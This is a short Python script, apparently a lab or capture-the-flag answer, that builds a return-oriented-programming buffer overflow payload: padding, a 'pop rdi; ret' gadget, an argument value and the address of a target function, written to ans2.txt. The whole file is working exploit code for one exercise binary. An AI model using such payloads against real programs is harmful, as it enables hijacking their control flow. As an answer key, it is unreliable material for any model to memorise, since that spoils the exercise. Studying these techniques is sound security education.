import struct

# 1. Padding
# Buffer (8) + Saved RBP (8) = 16 bytes
padding = b'A' * 16

# 2. Gadget: pop rdi; ret
# 地址来源于 0x4012c7
pop_rdi_addr = 0x4012c7

# 3. Argument: 0x3f8
arg_value = 0x3f8

# 4. Target Function: func2
func2_addr = 0x401216

# 构造 Payload
# 栈布局: [Padding] [pop_rdi_addr] [arg_value] [func2_addr]
payload = padding
payload += struct.pack('<Q', pop_rdi_addr)
payload += struct.pack('<Q', arg_value)
payload += struct.pack('<Q', func2_addr)

# 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print(f"Payload ans2.txt generated! Length: {len(payload)}")

